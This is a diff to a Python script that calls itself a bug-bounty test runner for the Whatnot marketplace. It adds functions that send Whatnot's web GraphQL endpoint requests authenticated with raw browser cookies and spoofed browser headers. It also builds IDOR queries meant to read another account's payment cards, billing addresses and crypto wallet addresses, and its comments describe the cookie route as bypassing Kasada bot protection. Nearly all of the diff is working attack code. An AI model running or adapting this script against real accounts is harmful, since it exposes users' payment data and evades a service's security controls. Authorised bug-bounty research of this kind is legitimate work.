@@ -488,6 +488,169 @@ def test_rtmp_idor(token_a, token_b):
         else:
             log("SAFE", f"RTMP key IDOR ({name}) — not returned", flat[:150])
 
+# ── Web Endpoint Cookie Auth Helpers ─────────────────────────────────────────
+WEB_HEADERS = {
+    "Content-Type": "application/json",
+    "X-Whatnot-App": "whatnot-web",
+    "X-Whatnot-App-Version": "20260507-1546",
+    "X-Whatnot-App-Context": "next-js/browser",
+    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
+    "Origin": "https://www.whatnot.com",
+    "Referer": "https://www.whatnot.com/",
+}
+
+def web_gql(cookie_str, query, variables=None):
+    """POST to the web GraphQL endpoint using raw cookie string auth."""
+    h = {**WEB_HEADERS, "Cookie": cookie_str}
+    body = {"query": query}
+    if variables:
+        body["variables"] = variables
+    try:
+        r = requests.post(WEB_GQL, headers=h, json=body, timeout=15)
+        return r
+    except Exception as e:
+        print(f"  web_gql error: {e}")
+        return None
+
+
+def test_web_schema_probe(cookie_a):
+    """Probe the web GraphQL endpoint to confirm auth and map available field names."""
+    print("\n[WEB-PROBE] Probing web endpoint schema and field names...")
+
+    # Confirm cookie auth works
+    r = web_gql(cookie_a, "{ me { id username } }")
+    if not r or r.status_code != 200:
+        print(f"  Cookie A auth FAILED: HTTP {r.status_code if r else 'no response'}")
+        print(f"  Response: {r.text[:200] if r else ''}")
+        return None
+    data = r.json()
+    me = data.get("data", {}).get("me", {})
+    a_id = me.get("id")
+    a_user = me.get("username")
+    print(f"  Account A confirmed: id={a_id}  username={a_user}")
+
+    # Confirm paymentCards field exists on me
+    r2 = web_gql(cookie_a, "{ me { paymentCards { cardType cardReference paymentGateway billingAddress { line1 city state zip country } } walletAddresses { address currency } } }")
+    print(f"  me.paymentCards probe: HTTP {r2.status_code if r2 else 'err'} — {r2.text[:200] if r2 else ''}")
+
+    # Probe top-level field names for user lookup
+    lookup_probes = [
+        ('publicUser(username)',    '{ publicUser(username: "whatnot") { id } }'),
+        ('userByUsername',          '{ userByUsername(username: "whatnot") { id } }'),
+        ('profile(username)',       '{ profile(username: "whatnot") { id } }'),
+        ('user(username)',          '{ user(username: "whatnot") { id } }'),
+        ('user(id)',                f'{{ user(id: "{a_id}") {{ id }} }}'),
+        ('seller(username)',        '{ seller(username: "whatnot") { id } }'),
+        ('account(username)',       '{ account(username: "whatnot") { id } }'),
+    ]
+    print("  Probing user-lookup queries:")
+    for name, q in lookup_probes:
+        r3 = web_gql(cookie_a, q)
+        if r3:
+            snippet = r3.text[:120].replace('\n', ' ')
+            print(f"    {name:30s}: HTTP {r3.status_code} — {snippet}")
+
+    return {"id": a_id, "username": a_user}
+
+
+def test_web_idor_payment(cookie_a, cookie_b, b_username=None):
+    """Test IDOR on payment card data using web endpoint cookie auth (no Seller API needed)."""
+    print("\n[WEB-IDOR] Testing payment card IDOR via web GraphQL endpoint...")
+
+    # Get Account B's identity from their own cookies
+    b_id = None
+    r_b = web_gql(cookie_b, "{ me { id username } }")
+    if r_b and r_b.status_code == 200:
+        b_data = r_b.json().get("data", {}).get("me", {})
+        b_id = b_data.get("id")
+        b_username = b_username or b_data.get("username")
+        print(f"  Account B confirmed: id={b_id}  username={b_username}")
+    else:
+        print(f"  Cookie B auth failed: HTTP {r_b.status_code if r_b else 'err'} — {r_b.text[:100] if r_b else ''}")
+        if not b_id and not b_username:
+            print("  Cannot proceed — provide --cookie-b and/or --username-b")
+            return
+
+    # Show Account B's own payment data to confirm it exists
+    r_bpay = web_gql(cookie_b,
+        "{ me { paymentCards { cardType cardReference paymentGateway "
+        "billingAddress { line1 line2 city state zip country } } "
+        "walletAddresses { address currency } } }")
+    if r_bpay and r_bpay.status_code == 200:
+        b_pay = r_bpay.json().get("data", {}).get("me", {})
+        if b_pay and (b_pay.get("paymentCards") or b_pay.get("walletAddresses")):
+            print(f"  Account B's own payment data (baseline): {json.dumps(b_pay)[:400]}")
+        else:
+            print(f"  Account B has no payment cards yet: {r_bpay.text[:150]}")
+    else:
+        print(f"  Could not fetch B's own payment data: {r_bpay.text[:100] if r_bpay else 'err'}")
+
+    # Build IDOR attack queries (Account A cookies → Account B's data)
+    queries = []
+    if b_id:
+        queries += [
+            ("user(id) direct",
+             f'{{ user(id: "{b_id}") {{ paymentCards {{ cardType cardReference paymentGateway '
+             f'billingAddress {{ line1 city zip country }} }} walletAddresses {{ address currency }} }} }}'),
+            ("alias me + victim user(id)",
+             f'{{ me {{ id }} victim: user(id: "{b_id}") {{ paymentCards {{ cardType cardReference }} '
+             f'walletAddresses {{ address }} }} }}'),
+        ]
+    if b_username:
+        queries += [
+            ("publicUser(username)",
+             f'{{ publicUser(username: "{b_username}") {{ paymentCards {{ cardType cardReference '
+             f'billingAddress {{ line1 city zip }} }} walletAddresses {{ address }} }} }}'),
+            ("userByUsername",
+             f'{{ userByUsername(username: "{b_username}") {{ paymentCards {{ cardType cardReference }} }} }}'),
+            ("profile(username)",
+             f'{{ profile(username: "{b_username}") {{ paymentCards {{ cardType cardReference }} }} }}'),
+            ("user(username)",
+             f'{{ user(username: "{b_username}") {{ paymentCards {{ cardType cardReference }} }} }}'),
+        ]
+
+    print(f"\n  Running {len(queries)} IDOR attack queries as Account A against Account B...")
+    for name, q in queries:
+        r = web_gql(cookie_a, q)
+        if not r:
+            print(f"  {name}: no response")
+            continue
+
+        print(f"\n  [{name}]")
+        print(f"  HTTP {r.status_code}")
+        print(f"  Response: {r.text[:300]}")
+
+        try:
+            d = r.json()
+        except Exception:
+            continue
+
+        flat = json.dumps(d)
+        # Check any top-level key that has paymentCards
+        target_data = None
+        for key in ["user", "victim", "publicUser", "userByUsername", "profile"]:
+            node = d.get("data", {}).get(key)
+            if node:
+                target_data = node
+                break
+
+        if target_data and target_data.get("paymentCards"):
+            cards = target_data["paymentCards"]
+            if any(c.get("cardType") or c.get("cardReference") for c in cards):
+                log("VULN",
+                    f"CRITICAL IDOR: Payment card data exposed cross-user ({name})",
+                    f"Account A read Account B's payment cards via web endpoint",
+                    json.dumps(target_data)[:600])
+        elif '"errors"' in flat and "paymentCards" not in flat:
+            print(f"  → Field/query does not exist on this schema")
+        elif '"errors"' in flat:
+            print(f"  → Access denied (field exists but resolver blocks it)")
+        elif target_data and target_data.get("paymentCards") == []:
+            print(f"  → paymentCards returned empty list (access control working)")
+        elif target_data and target_data.get("paymentCards") is None:
+            print(f"  → paymentCards returned null (access control working)")
+
+
 # ── Main ───────────────────────────────────────────────────────────────────────
 def main():
     parser = argparse.ArgumentParser(description="Whatnot Bug Bounty Test Runner")
@@ -497,6 +660,13 @@ def main():
     parser.add_argument("--password2", help="Account B password")
     parser.add_argument("--ssrf-callback", "--ssrf", dest="ssrf_callback",
                         help="Your webhook.site/interactsh URL for blind SSRF detection")
+    # Cookie-based auth (paste from DevTools → Network → Headers → Cookie:)
+    parser.add_argument("--cookie-a",   dest="cookie_a",
+                        help="Account A raw Cookie header value (from DevTools) for web endpoint IDOR tests")
+    parser.add_argument("--cookie-b",   dest="cookie_b",
+                        help="Account B raw Cookie header value (from DevTools) for web endpoint IDOR tests")
+    parser.add_argument("--username-b", dest="username_b",
+                        help="Account B Whatnot username (e.g. 'anyakoa') — used if cookie-b missing")
     args = parser.parse_args()
 
     print("=" * 70)
@@ -556,6 +726,17 @@ def main():
         test_idor_payment(token_a, token_b)
         test_stream_token(token_a, token_b)
         test_rtmp_idor(token_a, token_b)
+
+    # Web endpoint cookie-based IDOR tests (bypass Kasada — uses browser cookies)
+    if args.cookie_a:
+        print("\n" + "=" * 70)
+        print("  WEB ENDPOINT TESTS (Cookie Auth — bypasses Kasada/version gate)")
+        print("=" * 70)
+        test_web_schema_probe(args.cookie_a)
+        if args.cookie_b or args.username_b:
+            test_web_idor_payment(args.cookie_a, args.cookie_b or "", args.username_b)
+        else:
+            print("\n  [WEB-IDOR] Skipped — provide --cookie-b (and optionally --username-b)")
 
     # Summary
     print("\n" + "=" * 70)
